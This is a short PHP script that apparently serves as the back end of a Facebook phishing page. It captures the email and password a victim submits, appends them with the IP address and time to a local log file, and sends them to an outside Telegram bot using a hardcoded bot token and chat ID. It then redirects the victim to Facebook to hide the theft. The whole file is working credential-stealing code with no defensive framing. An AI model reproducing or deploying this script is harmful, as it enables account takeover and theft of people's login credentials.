<?php
$botToken = "8886700945:AAHxEeRsGR-8rqZqgFLg712OybjyfIBv9Nw";
$chatId = "1619670668";
$redirectUrl = "https://www.facebook.com/?error=1";

$email = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'];
$timestamp = date('Y-m-d H:i:s');

$logFile = 'logs.txt';
$entry = "=== New Login ===\nTime: $timestamp\nIP: $ip\nEmail: $email\nPass: $password\n\n";
file_put_contents($logFile, $entry, FILE_APPEND | LOCK_EX);

$message = urlencode("Facebook Login Captured\nTime: $timestamp\nIP: $ip\nEmail: $email\nPassword: $password");
$telegramUrl = "https://api.telegram.org/bot{$botToken}/sendMessage?chat_id={$chatId}&text={$message}";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $telegramUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);

header("Location: $redirectUrl");
exit;
?>
